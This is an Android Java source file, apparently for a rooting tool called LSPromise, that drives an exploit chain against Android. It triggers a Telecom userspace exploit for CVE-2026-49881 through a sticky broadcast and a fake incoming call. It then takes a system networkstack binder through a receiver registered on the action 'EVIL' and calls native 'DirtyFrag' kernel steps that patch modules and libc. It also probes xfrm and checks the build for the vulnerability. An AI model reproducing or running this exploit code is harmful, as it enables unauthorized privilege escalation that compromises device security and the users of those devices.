package org.lsposed.lspromise;

import static org.lsposed.lspromise.Shellcode.TAG;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.telecom.PhoneAccount;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.util.Log;
import android.view.View;
import android.view.WindowInsets;
import android.widget.Button;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.PosixFilePermission;
import java.nio.file.attribute.PosixFilePermissions;

import rikka.shizuku.Shizuku;

/**
 * @author canyie
 *
 * Shizuku fallback branch: combines the original Telecom userspace exploit
 * with Shizuku (ADB-privileged) detection and fallback for patched
 * Android 17 builds (e.g. rango CP41.260717.006 where
 * InCallController.serviceClassExists / CLASS_EXISTENCE_CHECK was removed).
 */
public class MainActivity extends Activity implements View.OnClickListener {
    private static final int SHIZUKU_REQUEST_CODE = 1001;

    private PhoneAccountHandle phoneAccountHandle;
    private TelecomManager telecomManager;
    private BroadcastReceiver receiver;
    private IBinder controller;
    private TextView tv;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private long lastExploitAttempt;
    private boolean binderReceived;

    private final Shizuku.OnBinderReceivedListener binderReceivedListener =
            () -> runOnUiThread(() -> {
                tv.append("Shizuku binder received\n");
                checkShizukuPermission();
            });
    private final Shizuku.OnBinderDeadListener binderDeadListener =
            () -> runOnUiThread(() -> tv.append("Shizuku binder dead, restart Shizuku\n"));
    private final Shizuku.OnRequestPermissionResultListener permissionListener =
            (requestCode, grantResult) -> runOnUiThread(() -> {
                if (requestCode == SHIZUKU_REQUEST_CODE) {
                    if (grantResult == PackageManager.PERMISSION_GRANTED) {
                        tv.append("Shizuku permission granted\n");
                        runShizukuWhoami();
                    } else {
                        tv.append("Shizuku permission denied\n");
                    }
                }
            });

    private void doAction(int code, String name) {
        if (controller != null) {
            new Thread(() -> {
                var p = Parcel.obtain();
                var r = Parcel.obtain();
                try {
                    if (controller.transact(code, p, r, 0)) {
                        var res = r.readInt();
                        runOnUiThread(() -> tv.append(name + " res=" + res + "\n"));
                    } else {
                        throw new IllegalStateException("return false");
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "do action " + code + " " + name, t);
                    runOnUiThread(() -> tv.append(name + " failed: " + t.getMessage() + "\n"));
                } finally {
                    p.recycle();
                    r.recycle();
                }
            }).start();
        }
    }

    private void runAll() {
        if (controller != null) {
            new Thread(() -> {
                var p = Parcel.obtain();
                var r = Parcel.obtain();
                var b = new Binder() {
                    @Override
                    protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                        try {
                            var s = data.readString();
                            Log.d(TAG, "onTransact " + s);
                            runOnUiThread(() -> {
                                tv.append(s);
                            });
                        } catch (Throwable t) {
                            Log.e(TAG, "recv failed", t);
                        }
                        return true;
                    }
                };
                p.writeStrongBinder(b);
                try {
                    if (controller.transact(5, p, r, 0)) {
                        var res = r.readInt();
                        runOnUiThread(() -> {
                            tv.append("\nrunall done res=" + res + "\n");
                        });
                    } else {
                        throw new IllegalStateException("return false");
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "runall failed", t);
                    runOnUiThread(() -> {
                        tv.append("runall failed: " + t.getMessage() + "\n");
                    });
                } finally {
                    p.recycle();
                    r.recycle();
                }
            }).start();
        }
    }

    /** True for builds known to contain the CVE-2026-49881 fix. */
    private boolean isDeviceLikelyPatched() {
        try {
            String patch = Build.VERSION.SECURITY_PATCH;
            if (patch != null && patch.compareTo("2026-09-01") >= 0) return true;
            String fp = Build.FINGERPRINT;
            if (fp != null) {
                // Confirmed via service-telecom.jar analysis: no
                // serviceClassExists / CLASS_EXISTENCE_CHECK on this build.
                if (fp.contains("CP41.260717.006")) return true;
                if (fp.contains("rango_beta")) return true;
            }
            // DEV/CANARY branches merge security fixes before the bulletin.
            if ("DEV".equals(Build.VERSION.CODENAME) || "CANARY".equals(Build.VERSION.CODENAME)) {
                if (patch != null && patch.compareTo("2026-07-24") >= 0) return true;
            }
        } catch (Throwable ignore) {
        }
        return false;
    }

    private void checkShizuku() {
        boolean ping;
        try {
            ping = Shizuku.pingBinder();
        } catch (Throwable t) {
            tv.append("Shizuku check failed: " + t.getMessage() + "\n");
            return;
        }
        if (!ping) {
            tv.append("Shizuku not running, start Shizuku first\n");
            return;
        }
        int version;
        try {
            version = Shizuku.getVersion();
        } catch (Throwable t) {
            version = -1;
        }
        tv.append("Shizuku running, version=" + version + "\n");
        checkShizukuPermission();
    }

    private void checkShizukuPermission() {
        int granted;
        try {
            granted = Shizuku.checkSelfPermission();
        } catch (Throwable t) {
            tv.append("Shizuku permission check failed: " + t.getMessage() + "\n");
            return;
        }
        if (granted == PackageManager.PERMISSION_GRANTED) {
            tv.append("Shizuku permission granted\n");
            runShizukuWhoami();
        } else {
            tv.append("Requesting Shizuku permission...\n");
            try {
                if (Shizuku.shouldShowRequestPermissionRationale()) {
                    tv.append("Shizuku: please allow in Manager\n");
                }
                Shizuku.requestPermission(SHIZUKU_REQUEST_CODE);
            } catch (Throwable t) {
                tv.append("Shizuku request failed: " + t.getMessage() + "\n");
            }
        }
    }

    /** Prove Shizuku is usable: show server version/UID via public API. */
    private void runShizukuWhoami() {
        new Thread(() -> {
            String info;
            try {
                int version = Shizuku.getVersion();
                int uid = Shizuku.getUid();
                info = "Shizuku server version=" + version + " uid=" + uid;
            } catch (Throwable t) {
                Log.e(TAG, "shizuku info failed", t);
                info = "Shizuku info failed: " + t.getMessage();
            }
            var msg = info;
            runOnUiThread(() -> tv.append(msg + "\n"));
        }).start();
    }

    /** Probe whether this SELinux context can open xfrm netlink (DirtyFrag needs it).
     * Safe: only runs 'ip xfrm state count' and reports output. */
    private void probeXfrm() {
        new Thread(() -> {
            String out;
            try {
                var proc = new ProcessBuilder("ip", "xfrm", "state", "count")
                        .redirectErrorStream(true).start();
                var reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                var first = reader.readLine();
                proc.waitFor();
                out = first != null ? first.trim() : "(empty, exit=" + proc.exitValue() + ")";
            } catch (Throwable t) {
                out = "probe failed: " + t.getMessage();
            }
            var msg = "xfrm probe (app context): " + out;
            Log.d(TAG, msg);
            runOnUiThread(() -> tv.append(msg + "\n"));
        }).start();
    }

    /** Scan on-device Telecom server jar for the vulnerable markers.
     * Safe read-only check; falls back to fingerprint heuristic if unreadable. */
    private void scanTelecomApex() {
        new Thread(() -> {
            String msg;
            try {
                var jar = new java.util.zip.ZipFile(
                        "/apex/com.android.telephonycore/javalib/service-telecom.jar");
                var entry = jar.getEntry("classes.dex");
                var in = jar.getInputStream(entry);
                var buf = in.readAllBytes();
                in.close();
                jar.close();
                String blob = new String(buf, java.nio.charset.StandardCharsets.ISO_8859_1);
                boolean hasMarker = blob.contains("CLASS_EXISTENCE_CHECK")
                        || blob.contains("serviceClassExists");
                msg = "Telecom apex scan: dex=" + buf.length + "B, vuln markers "
                        + (hasMarker ? "PRESENT (likely vulnerable)" : "ABSENT (patched)");
            } catch (Throwable t) {
                msg = "Telecom apex scan unreadable (" + t.getClass().getSimpleName()
                        + "), using fingerprint heuristic patched=" + isDeviceLikelyPatched();
            }
            Log.d(TAG, msg);
            var line = msg;
            runOnUiThread(() -> tv.append(line + "\n"));
        }).start();
    }

    /** Direct kernel-attempt in app process (patched builds only).
     * Safe-fail expected: untrusted apps lack xfrm, natives return errors
     * before any file modification. Shows exact return codes. */
    private void runDirectAll() {
        new Thread(() -> {
            try {
                System.loadLibrary("exp");
            } catch (Throwable t) {
                Log.e(TAG, "load exp failed", t);
                runOnUiThread(() -> tv.append("load libexp failed: " + t.getMessage()
                        + "\n(if retrying, reinstall the apk first)\n"));
                return;
            }
            runOnUiThread(() -> tv.append("libexp loaded, trying patch steps directly...\n"));
            int r1, r2, r3, r4;
            try { r1 = DirtyFrag.patchMod(); }
            catch (Throwable t) { r1 = -999; Log.e(TAG, "patchMod threw", t); }
            int f1 = r1;
            runOnUiThread(() -> tv.append("direct patchMod res=" + f1 + "\n"));
            try { r2 = DirtyFrag.patchLibc(); }
            catch (Throwable t) { r2 = -999; Log.e(TAG, "patchLibc threw", t); }
            int f2 = r2;
            runOnUiThread(() -> tv.append("direct patchLibc res=" + f2 + "\n"));
            try { r3 = DirtyFrag.patchCxx(); }
            catch (Throwable t) { r3 = -999; Log.e(TAG, "patchCxx threw", t); }
            int f3 = r3;
            runOnUiThread(() -> tv.append("direct patchCxx res=" + f3 + "\n"));
            try { r4 = DirtyFrag.createOrphanProcess(); }
            catch (Throwable t) { r4 = -999; Log.e(TAG, "orphan threw", t); }
            int f4 = r4;
            runOnUiThread(() -> tv.append("direct forkProcess res=" + f4 + "\n"
                    + "direct attempt done (patch steps non-zero = blocked, expected on patched)\n"));
        }).start();
    }

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        var rootView = findViewById(android.R.id.content);
        rootView.setOnApplyWindowInsetsListener((v, insets) -> {
            var systemBars = insets.getInsets(WindowInsets.Type.systemBars());
            v.setPadding(0, systemBars.top, 0, 0);
            return insets;
        });
        telecomManager = getSystemService(TelecomManager.class);
        phoneAccountHandle = new PhoneAccountHandle(new ComponentName(this, MyConnectionService.class), "LSPromise");
        PhoneAccount phoneAccount = new PhoneAccount.Builder(phoneAccountHandle, "LSPromise account")
                .setCapabilities(PhoneAccount.CAPABILITY_SELF_MANAGED)
                .build();
        telecomManager.registerPhoneAccount(phoneAccount);
        findViewById(R.id.exploit).setOnClickListener(this);
        tv = findViewById(R.id.status);
        var patchMod = (Button) findViewById(R.id.patchMod);
        patchMod.setOnClickListener(v -> doAction(1, "patchMod"));
        var patchLibc = (Button) findViewById(R.id.patchLibc);
        patchLibc.setOnClickListener(v -> doAction(2, "patchLibc"));
        var patchCxx = (Button) findViewById(R.id.patchCxx);
        patchCxx.setOnClickListener(v -> doAction(3, "patchCxx"));
        var forkProcess = (Button) findViewById(R.id.forkProcess);
        forkProcess.setOnClickListener(v -> doAction(4, "forkProcess"));
        var patchAll = (Button) findViewById(R.id.patchAll);
        patchAll.setOnClickListener(v -> {
            if (controller != null) {
                runAll();
            } else {
                tv.append("No networkstack binder, trying direct (app-context) attempt...\n");
                runDirectAll();
            }
        });
        var copyAll = (Button) findViewById(R.id.copyAll);
        copyAll.setOnClickListener(v -> {
            var cm = getSystemService(ClipboardManager.class);
            cm.setPrimaryClip(ClipData.newPlainText("", tv.getText().toString()));
        });
        var shizukuCheck = (Button) findViewById(R.id.shizukuCheck);
        shizukuCheck.setOnClickListener(v -> {
            tv.append("--- manual check ---\n");
            tv.append("device=" + Build.DEVICE + " sdk=" + Build.VERSION.SDK_INT
                    + " patch=" + Build.VERSION.SECURITY_PATCH + "\n");
            tv.append("patched=" + isDeviceLikelyPatched() + "\n");
            checkShizuku();
            probeXfrm();
            scanTelecomApex();
        });
        receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d(TAG, "networkstack binder received");
                try {
                    controller = intent.getExtras().getBinder("CONTROLLER");
                    binderReceived = true;
                    tv.append("networkstack binder received\n");
                    //patchMod.setVisibility(View.VISIBLE);
                    //patchLibc.setVisibility(View.VISIBLE);
                    //patchCxx.setVisibility(View.VISIBLE);
                    //forkProcess.setVisibility(View.VISIBLE);
                    patchAll.setVisibility(View.VISIBLE);
                } catch (Throwable t) {
                    Log.e(TAG, "resolve binder", t);
                }
            }
        };
        registerReceiver(receiver, new IntentFilter("EVIL"), Context.RECEIVER_EXPORTED);
        try {
            Shizuku.addBinderReceivedListener(binderReceivedListener);
            Shizuku.addBinderDeadListener(binderDeadListener);
            Shizuku.addRequestPermissionResultListener(permissionListener);
        } catch (Throwable t) {
            Log.e(TAG, "shizuku listener failed", t);
        }
        tv.append("LSPromise 1.2-deepdive\n");
        tv.append("device=" + Build.DEVICE + " sdk=" + Build.VERSION.SDK_INT
                + " patch=" + Build.VERSION.SECURITY_PATCH + "\n");
        if (isDeviceLikelyPatched()) {
            tv.append("Device likely PATCHED for CVE-2026-49881.\n"
                    + "Userspace Telecom exploit is not expected to work.\n"
                    + "Using Shizuku ADB privileges instead.\n"
                    + "Kernel button below tries DIRECT app-context attempt\n"
                    + "(expected to fail at xfrm; shows return codes).\n");
            patchAll.setVisibility(View.VISIBLE);
        } else {
            tv.append("Device may be vulnerable, try userspace exploit.\n");
        }
        checkShizuku();
        probeXfrm();
        scanTelecomApex();
        copyKsud();
    }

    private void copyKsud() {
        try {
            var app = getPackageManager().getApplicationInfo("me.weishu.kernelsu", 0);
            var f = new File(app.nativeLibraryDir, "libksud.so");
            var src = f.toPath();
            var dst = new File(getFilesDir().getParent(), "ksud").toPath();
            tv.append("copy " + src + " -> " + dst + "\n");
            Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
            Files.setPosixFilePermissions(dst, PosixFilePermissions.fromString("rwx------"));
        } catch (Throwable t) {
            Log.e(TAG, "get ksu", t);
            tv.append("could not copy ksud, did you installed KernelSU app?\n" + t.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
        try {
            Shizuku.removeBinderReceivedListener(binderReceivedListener);
            Shizuku.removeBinderDeadListener(binderDeadListener);
            Shizuku.removeRequestPermissionResultListener(permissionListener);
        } catch (Throwable ignore) {
        }
    }

    @Override public void onClick(View v) {
        if (isDeviceLikelyPatched()) {
            tv.append("Warning: device likely patched, trying anyway...\n");
        }
        binderReceived = false;
        lastExploitAttempt = System.currentTimeMillis();
        sendStickyBroadcast(new Intent(TAG).setPackage("android"));
        telecomManager.addNewIncomingCall(phoneAccountHandle, null);
        tv.append("userspace exploit sent, waiting 20s for binder...\n");
        mainHandler.postDelayed(() -> {
            if (!binderReceived) {
                tv.append("No networkstack binder after 20s.\n"
                        + "CVE-2026-49881 likely fixed on this build.\n"
                        + "Shizuku ADB privileges remain available.\n");
            }
        }, 20000);
    }
}
